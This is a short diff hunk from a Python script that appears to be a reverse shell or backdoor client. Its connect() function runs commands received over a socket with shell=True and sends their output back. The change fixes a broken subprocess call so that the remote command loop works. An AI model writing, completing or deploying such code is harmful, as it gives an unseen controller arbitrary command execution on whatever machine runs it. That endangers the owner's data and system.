@@ -16,7 +16,7 @@ def connect():
 
         else:
 
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stde)
+            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send( CMD.stdout.read() )
             s.send( CMD.stderr.read() )
 
